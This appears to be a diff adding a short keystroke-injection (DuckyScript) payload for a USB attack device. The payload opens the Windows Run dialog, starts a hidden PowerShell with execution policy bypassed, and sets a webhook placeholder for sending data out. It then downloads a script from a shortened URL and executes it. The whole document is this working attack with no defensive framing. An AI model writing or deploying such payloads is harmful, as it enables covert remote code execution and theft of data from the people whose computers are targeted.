@@ -1,0 +1,5 @@
+DELAY 400
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_LINK'; irm https://is.gd/BIDtyK | iex
+ENTER
